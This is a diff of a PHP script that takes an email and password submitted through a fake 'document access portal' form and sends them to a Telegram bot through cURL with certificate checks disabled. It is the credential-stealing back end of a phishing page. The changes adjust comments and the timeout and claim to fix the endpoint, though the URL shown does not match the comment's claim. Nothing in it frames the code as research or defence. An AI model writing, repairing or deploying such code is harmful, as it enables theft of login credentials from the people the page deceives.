@@ -14,12 +14,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     if (!empty($email) && !empty($password)) {
         
-        // 2. Clear clean text layout (No markdown syntax on the email to avoid crashes)
+        // 2. Clear clean text layout
         $message_text = "📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n"
                       . "📧 Portal Email: " . $email . "\n"
                       . "🔑 Access Key: " . $password;
 
-        // 3. Official Telegram Bot API gateway URL
+        // 3. FIXED ENDPOINT: Added api.telegram.org/bot to route data properly
         $telegram_url = "https://telegram.org" . $bot_token . "/sendMessage";
         
         // 4. Request payload parameters
@@ -38,7 +38,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Keep timeouts fast so Vercel doesn't hang
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
         
         $response = curl_exec($ch);
         curl_close($ch);
